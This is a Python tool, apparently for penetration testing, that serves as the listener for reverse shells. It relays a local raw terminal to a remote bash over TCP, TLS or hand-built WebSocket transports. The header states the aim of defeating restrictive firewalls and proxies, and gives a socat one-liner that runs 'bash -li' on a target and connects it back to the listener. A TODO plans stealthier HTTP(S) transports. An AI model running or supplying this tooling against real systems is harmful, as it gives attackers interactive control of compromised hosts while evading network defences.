#!/usr/bin/env python3
# (Reverse shell) listener and pseudoterminal forwarder
#
# The idea is to provide something akin to the following:
# listener: socat file:$(tty),raw,echo=0 tcp-listen:4444
#   target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener-addr>:4444
#
# But with different transports, specifically websocket and secure websockets to defeat restrictive firewalls/proxies

# TODO How to set the size of the remote target pty?
#      os.get_terminal_size() gives the local tty size and sigwinch signals changes
#      Set the size of a pty/tty with fnctl.ioctl(<fd>, termios.TIOCSWINSZ, struct.pack('HHHH', lines, cols, 0, 0)), ref man 4 tty_ioctl 
#      but only the target socket is available, this would need to be relayed to the target pty
#      (via a second socket or a specially-marked packet?  oob is not an option as it's only a single byte)
#      Crude workaround is to export the size via the COLUMNS LINES environment variables.

import argparse, base64, datetime, functools, hashlib, os, select, ssl, socket, struct, sys, termios, time, traceback, tty

class Tty:
    def __init__(self, path):
        self.path = path

    def __enter__(self):
        self.__fd = os.open(self.path, os.O_RDWR)
        self.__attr = termios.tcgetattr(self.__fd)

        # Convenience function for several termios settings
        # Ref: <python-source>/Lib/tty.py, man 3 termios
        tty.setraw(self.__fd)

        return self

    def __exit__(self, exctype, excval, traceback):
        termios.tcsetattr(self.__fd, termios.TCSANOW, self.__attr)
        os.close(self.__fd)

    def fileno(self):
        return self.__fd

    def read(self, n=1024):
        rv = os.read(self.__fd, n)
        assert len(rv) > 0
        return rv

    def write(self, data):
        os.write(self.__fd, data)

class Socket:
    def __init__(self, port):
        self.port = port

    def __enter__(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('', self.port))
        server.listen(0)

        self._client, _ = server.accept()

        # No further need for the server socket
        server.close()

        return self

    def __exit__(self, exctype, excval, traceback):
        self._client.close()

    def fileno(self):
        return self._client.fileno()

    def read(self, n=1024):
        rv = self._client.recv(n)
        assert len(rv) > 0
        return rv

    def write(self, data):
        self._client.sendall(data)

class TlsSocket(Socket):
    def __enter__(self):
        rv = super().__enter__()

        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        # openssl req -x509 -nodes -newkey rsa:4096 -keyout server.key -out server.crt -subj '/CN=localhost'
        # Note that public (but not private) ips can (and should) be used as the certificate common name.
        context.load_cert_chain('server.crt', 'server.key')

        rv._origclient = rv._client
        rv._client = context.wrap_socket(rv._client, server_side=True)

        # Using tls sockets with select() isn't straightforward because select() works with raw sockets.
        # Ie data may be available on the socket but that doesn't mean data will be available at the tls level.
        # A simple workaround is to use non-blocking sockets and gracefully handle SSL_ERROR_WANT_READ (tls equiv of EWOULDBLOCK).

        rv._client.setblocking(False)

        return rv

    def __exit__(self, exctype, excval, traceback):
        self._client.close()
        self._origclient.close()

    def read(self, n=1024):
        try:
            rv = self._client.recv(n)
        except ssl.SSLError as e:
            if e.errno == ssl.SSL_ERROR_WANT_READ:
                return None
            raise e

        if self._client.pending() > 0:
            rv += self._client.recv(self._client.pending())

        assert len(rv) > 0
        return rv

class WebSocket:
    def __init__(self, port):
        self.port = port

    def __enter__(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('', self.port))
        server.listen(0)

        self._client, _ = server.accept()
        server.close()

        headers = self._client.recv(4096).decode('utf-8').splitlines()
        assert len([h for h in headers if h == 'Upgrade: websocket']) > 0

        hs = [h for h in headers if h.startswith('Sec-WebSocket-Key')]
        assert len(hs) == 1
        key = hs[0].split()[1]

        h = hashlib.sha1()
        h.update(key.encode('utf-8') + b'258EAFA5-E914-47DA-95CA-C5AB0DC85B11')
        accept = base64.b64encode(h.digest()).decode('utf-8')
        
        self._client.sendall(( 'HTTP/1.1 101 Web Socket Protocol Handshake\r\n' +
                                'Upgrade: websocket\r\n' +
                                'Connection: Upgrade\r\n' +
                               f'Date: {datetime.datetime.now(datetime.timezone.utc).strftime("%c %Z")}\r\n' +
                               f'Sec-WebSocket-Accept: {accept}\r\n' +
                                '\r\n'
                              ).encode('utf-8'))

        return self

    def __exit__(self, exctype, excval, traceback):
        self._client.close()

    def fileno(self):
        return self._client.fileno()

    def read(self):
        b1, b2 = struct.unpack('BB', self._client.recv(2))
        finbit = b1 & 0x80 == 0x80
        assert finbit
        opcode = b1 & 0x0f
        assert opcode == 2 # Binary frame
        maskbit = b2 & 0x80 == 0x80
        assert maskbit
        payloadlen = b2 & 0x7f

        if payloadlen < 126:
            pass
        elif payloadlen == 126:
            payloadlen = struct.unpack('>H', self._client.recv(2))[0]
        else: # payloadlen == 127:
            payloadlen = struct.unpack('>Q', self._client.recv(2))[0]

        key = self._client.recv(4)

        masked_payload = self._client.recv(payloadlen, socket.MSG_WAITALL)
        assert len(masked_payload) == payloadlen

        payload = b''
        i = 0
        for b in masked_payload:
            payload += bytes([b ^ key[i]])
            i = (i + 1) % 4

        return payload

    def write(self, data):
        frame = b'\x82'

        if len(data) < 126:
            frame += bytes([len(data)])
        elif len(data) < 65536:
            frame += b'\x7e' + struct.pack('>H', len(data))
        else:
            assert len(data) < 2**63
            frame += b'\x7f' + struct.pack('>Q', len(data))

        self._client.sendall(frame + data)

class TlsWebSocket(WebSocket):
    def __enter__(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('', self.port))
        server.listen(0)

        self._client, _ = server.accept()
        server.close()

        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain('server.crt', 'server.key')

        self._origclient = self._client
        self._client = context.wrap_socket(self._client, server_side=True)

        self._client.setblocking(False)

        buf = None
        while not buf:
            time.sleep(0.1)
            try:
                buf = self._client.recv(4096)
            except ssl.SSLError as e:
                if e.errno == ssl.SSL_ERROR_WANT_READ:
                    continue
                raise e

        while self._client.pending() > 0:
            buf += self._client.recv(self._client.pending())

        headers = buf.decode('utf-8').splitlines()
        assert len([h for h in headers if h == 'Upgrade: websocket']) > 0

        hs = [h for h in headers if h.startswith('Sec-WebSocket-Key')]
        assert len(hs) == 1
        key = hs[0].split()[1]

        h = hashlib.sha1()
        h.update(key.encode('utf-8') + b'258EAFA5-E914-47DA-95CA-C5AB0DC85B11')
        accept = base64.b64encode(h.digest()).decode('utf-8')
        
        self._client.sendall(( 'HTTP/1.1 101 Web Socket Protocol Handshake\r\n' +
                                'Upgrade: websocket\r\n' +
                                'Connection: Upgrade\r\n' +
                               f'Date: {datetime.datetime.now(datetime.timezone.utc).strftime("%c %Z")}\r\n' +
                               f'Sec-WebSocket-Accept: {accept}\r\n' +
                                '\r\n'
                              ).encode('utf-8'))

        return self

    def __exit__(self, exctype, excval, traceback):
        self._client.close()
        self._origclient.close()

    def read(self):
        try:
            buf = self._client.recv(2)
        except ssl.SSLError as e:
            if e.errno == ssl.SSL_ERROR_WANT_READ:
                return None
            raise e

        # The remaining recv()s should not fail since the websocket frame header should have been received in full.
        # Only retrieving the payload may reasonably block (or raise SSL_ERROR_WANT_READ), which is handled by the loop below.

        assert len(buf) == 2
        b1, b2 = struct.unpack('BB', buf)
        finbit = b1 & 0x80 == 0x80
        assert finbit
        opcode = b1 & 0x0f
        assert opcode == 2 # Binary frame
        maskbit = b2 & 0x80 == 0x80
        assert maskbit
        payloadlen = b2 & 0x7f

        if payloadlen < 126:
            pass
        elif payloadlen == 126:
            payloadlen = struct.unpack('>H', self._client.recv(2))[0]
        else: # payloadlen == 127:
            payloadlen = struct.unpack('>Q', self._client.recv(2))[0]

        key = self._client.recv(4)

        while self._client.pending() < payloadlen:
            time.sleep(0.1)
        masked_payload = self._client.recv(payloadlen)

        payload = b''
        i = 0
        for b in masked_payload:
            payload += bytes([b ^ key[i]])
            i = (i + 1) % 4

        return payload

# TODO Prototype novel transports, eg periodic http(s) requests for especially restrictive networks

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', '-p', type=int, default=8000)
    parser.add_argument('--tty', '-y', help='connect to a different tty')

    transport_type = parser.add_mutually_exclusive_group()
    transport_type.add_argument('--socket', '-s', action='store_const', const='Socket')
    transport_type.add_argument('--tls-socket', '-t', action='store_const', const='TlsSocket')
    transport_type.add_argument('--websocket', '-w', action='store_const', const='WebSocket')
    transport_type.add_argument('--tls-websocket', '-x', action='store_const', const='TlsWebSocket')

    args = parser.parse_args()

    transport = functools.reduce(lambda a,b: a or b,
                                 [v for k,v in args.__dict__.items() if 'socket' in k]) \
                    or 'Socket'

    # /dev/tty is a synonym for the controlling terminal, ref man 4 tty
    # (and so is the equivalent to os.ttyname(sys.stdout.fileno()))
    ttypath = args.tty or '/dev/tty'
    with Tty(ttypath) as tty, \
         locals()[transport](args.port) as target:
            
        run, print_exc = True, True
        while run:
            rlist, _, _ = select.select([tty, target], [], [], 1.0)

            for r in rlist:
                try:
                    d = r.read()

                except AssertionError as e:
                    # Empty reads occur during a normal socket close
                    # TODO This is clumsy, investigate alternate approaches
                    exctype, excvalue, trcback = sys.exc_info()
                    _, _, func, text = traceback.extract_tb(trcback)[-1]
                    if func == 'read' and text == 'assert len(rv) > 0':
                        print_exc = False

                    run = False
                    break

                except Exception as e:
                    exctype, excvalue, trcback = sys.exc_info()
                    run = False
                    break

                if d:
                    w = target if r == tty else tty
                    w.write(d)

    # Wait until the termios settings have been restored before printing this
    if print_exc:
        traceback.print_exception(exctype, excvalue, trcback)
